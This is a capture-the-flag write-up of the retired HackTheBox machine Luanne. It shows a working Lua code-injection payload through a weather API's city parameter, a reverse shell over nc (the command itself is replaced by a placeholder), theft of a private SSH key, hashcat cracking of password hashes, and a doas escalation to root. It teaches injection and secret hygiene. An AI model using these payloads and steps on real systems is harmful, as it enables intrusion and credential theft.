---
layout: post
title: "The Weather Took a Command"
subtitle: "HTB Luanne, where a weather API runs the city you ask for as code, a development server hands out an SSH key, and an encrypted backup confesses the root password"
date: 2021-04-03 12:00:00 +0000
description: "A Lua weather API treats the city name as code, and the whole box unzips from there."
image: /assets/og/the-weather-took-a-command.png
tags: [hackthebox, writeup]
---

Luanne is a NetBSD box, which is already a small joke at your expense, because it is the rare machine where your reflexes are wrong from the first second. It asks you for a city and gives you a weather forecast, and somewhere in the polite little exchange the server stops reading the city as a place and starts reading it as instructions. That is the entire opening move. From there the box is a chain of people leaving doors propped: a process manager with a factory password, a development web server quietly serving someone's private SSH key, and a backup file that, once you make the host decrypt it, simply tells you the root password out loud. Nothing here is a memory-corruption magic trick. Every link is a thing that was built to be helpful and never learned where help ends.

```
        L U A N N E   W E A T H E R
        ===========================
        ?city=London    ->  "here is your forecast"
        ?city=')os.execute('id')--
                        ->  the api reads your "city"
                            and runs it as a program
                 |
                 v
        a shell as _httpd, then a key left in
        a public folder, then a backup that
        whispers the root password when opened
                                            雨
```

## 0x01 · the front desk

`nmap -sC -sV` against the box comes back short, and one of the three answers is unusual enough to make you sit up.

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.0 (NetBSD)
80/tcp   open  http     nginx 1.19.0 (401 Unauthorized)
9001/tcp open  http     Medusa httpd 1.12 (Supervisor process manager)
```

Port 80 throws a basic-auth box at you and folds its arms, so it is a wall for now. The interesting one is 9001. That `Medusa httpd` banner is the web front end of Supervisor, a tool that babysits long-running programs and restarts them when they die. Think of it like the dashboard in a restaurant kitchen that shows which burners are lit. It is not food, it is not the menu, but it tells you exactly what is cooking and where. And on this box, that dashboard is wearing a factory lock.

## 0x02 · the factory password

Supervisor's web panel wants credentials, and it accepts the most embarrassing pair there is. `user` and `123`, straight out of the default config that somebody copied and never changed. The panel opens, and the prize is not a feature. It is the process list.

```
/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather \
    /usr/local/webapi/weather.lua
```

Read that line like a treasure map. There is a second web server running, bound to `127.0.0.1` on port 3000 so the outside world cannot touch it directly, and it is serving a `weather` application written in Lua. The dashboard meant to show you the kitchen has just told you there is a private burner in the back you were not supposed to know about. The locked port 80 is the public face of that same weather app, and now you know its shape.

## 0x03 · the city that was a command

Enumerate the app and an endpoint surfaces, `/weather/forecast`, which takes a `city` parameter. Feed it a real UK city and it answers nicely. Feed it `?city=list` and it enumerates the ones it knows. Feed it a single quote and it panics with a Lua syntax error, and that error is a confession.

Here is what the script does under the hood. It takes the city you sent and pastes it directly into a chunk of Lua source code that builds an error message, then it calls `load()` on that whole string and runs it. `load()` is Lua's way of saying "treat this text as a program and execute it." Picture a weather clerk who, when you give him a city he does not recognize, writes "unknown city: " plus your exact words onto a slip and hands the slip to a machine that runs anything written on it. If you write "Atlantis," the machine prints a harmless complaint. If you write the right punctuation, you close his sentence early and start writing your own program after it, and the machine runs that too. The clerk never checked whether your "city" was a place or a payload.

So you escape the string and append your own call. The classic single-quote-and-comment shape does it.

```
$ curl -G --data-urlencode "city=') os.execute('id') --" \
    'http://10.10.10.218/weather/forecast'
{"code": 500, "error": "unknown city: uid=24(_httpd) gid=24(_httpd)"}
```

The error message is supposed to echo your city back. Instead it echoes back the output of `id`, because `os.execute` ran on the server. That `--` at the end is a Lua comment that swallows the rest of the original line so the broken syntax never trips. You are now running commands as `_httpd`, the low-privilege account the web server lives under.

Trade the proof for a real foothold. NetBSD's stripped-down shells make the usual one-liners sulk, so the reliable move is a named-pipe reverse shell, the old FIFO trick where a pipe file ferries input and output between `nc` and `/bin/sh`.

```
$ curl -G --data-urlencode \
  "city=') os.execute('[ FIFO reverse shell over nc back to 10.10.14.4 on 443 ]') --" \
  'http://10.10.10.218/weather/forecast'
```

Start a listener, fire the request, and a prompt drops in.

```
$ nc -lvnp 443
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.218]
$ id
uid=24(_httpd) gid=24(_httpd)
```

## 0x04 · the password file and the key in the open

`_httpd` is a service nobody, which is the right altitude to start hunting for reused secrets. Web servers spill their passwords in predictable places, and the basic-auth wall from port 80 has to keep its credentials somewhere. It does, in a `.htpasswd`.

```
$ cat /var/www/.htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```

That `$1$` prefix marks an md5crypt hash. Hand it to hashcat in mode 500 and a short word falls out.

```
$ hashcat -m 500 hash.txt rockyou.txt
$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest
```

Now you have `webapi_user:iamthebest`. The question is what it unlocks. Remember the process list mentioned a private app on localhost. Poke around and there is a second internal http server on `127.0.0.1:3001`, this one running as the user `r.michaels`, and it serves that user's `public_html` directory. NetBSD's httpd has a tilde feature, the old `~username` convention that maps a URL to a home directory's public folder. Picture an apartment building where every tenant has a little parcel shelf in the lobby, and the shelf is labeled with their name. Anyone walking through can read what is on the shelf. What `r.michaels` left on theirs is the worst possible thing.

```
$ curl -s http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user:iamthebest
-----BEGIN RSA PRIVATE KEY-----
...
```

A private SSH key, sitting in a public folder, fetched with a password we cracked from a different file entirely. The credential reuse is the hinge. One word, `iamthebest`, walked from the basic-auth wall into an internal service it was never meant to guard.

## 0x05 · the user, and a backup that talks

Save the key, fix its permissions, and SSH in as its owner.

```
$ ssh -i iceberg_rmichaels r.michaels@10.10.10.218
r.michaels@luanne$ id
uid=1000(r.michaels) groups=1000(r.michaels)
r.michaels@luanne$ cat user.txt
████████████████████████████████
```

Now the climb to root. On NetBSD the sudo equivalent is `doas`, and its config lives at `/usr/pkg/etc/doas.conf`. It reads as generously as it gets.

```
permit r.michaels as root
```

That line says `r.michaels` may become root, but `doas` still demands the user's own password to prove it is really them, and an SSH key got us in without ever knowing it. So the password is the missing piece, and the box has hidden it somewhere clever. In `r.michaels`'s home is a backups directory holding `devel_backup-2020-09-16.tar.gz.enc`. That `.enc` is the tell. It is encrypted, and you cannot open it on your own machine because you do not hold the key.

But the host does. NetBSD ships `netpgp`, and `r.michaels` has a personal keyring sitting right there in their home. Think of it like finding a locked diary next to its owner's keyring on the same nightstand. You do not need to pick the lock if the key is hanging beside it. Let the host decrypt its own secret.

```
r.michaels@luanne$ netpgp --decrypt \
    --output=/tmp/iceberg.tar.gz backups/devel_backup-2020-09-16.tar.gz.enc
r.michaels@luanne$ tar xzf /tmp/iceberg.tar.gz
```

Inside the backup is an older copy of the weather app, and with it an older `.htpasswd` carrying a different hash than the live one. Crack that one too.

```
$ hashcat -m 500 backup_hash.txt rockyou.txt
...:littlebear
```

And there it is. `littlebear` is `r.michaels`'s actual password, frozen in a backup from a day when the app config still carried it. Feed it to `doas`.

```
r.michaels@luanne$ doas sh
Password: littlebear
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
# cat /root/root.txt
████████████████████████████████
```

## 0x06 · the honest caveat

It is easy to file Luanne under "NetBSD curiosity, fun for the tilde trick" and move on. That misses the spine of it. The root cause at the top of this chain is the oldest mistake in computing, the one Lame teaches and Luanne teaches and a thousand boxes in between teach: a program took text a stranger sent and treated part of it as an instruction instead of as inert data. The weather API did not have to call `load()` on anything containing the user's city. The moment it did, "what city would you like" became "what program would you like me to run," and no firewall or NetBSD obscurity was going to save it. Injection does not care what operating system it lives on.

But the part that should actually keep an engineer up is not the flashy `os.execute`. It is everything downstream. A factory password nobody rotated. A private SSH key parked in a folder the world can read. A password that should have died the day it was set, preserved forever inside a backup that the system itself would happily decrypt for anyone who reached the home directory. None of those are bugs. Every one ships green, passes every scanner, and quietly waits. The lesson is that a secret has a lifespan, and a backup is where secrets go to outlive the day they were supposed to be retired. Encrypting the backup felt like diligence. Leaving the decryption key on the same machine turned the lock into decoration.

## 0x07 · outro

```
you asked the weather for a city.
it ran your city as a program.

then a key in a public folder,
a password the building handed out,
and a backup that confessed when opened.

nothing forced. every lock left on the nightstand.
rotate the secret. mind the backup. wear black.

                                                            EOF
```

---

*HTB: Luanne, retired 27 Mar 2021. An easy NetBSD box that is really a lecture on injection and on how long a secret survives in a file you forgot to burn. The weather still takes commands in a lab and nowhere you don't own.*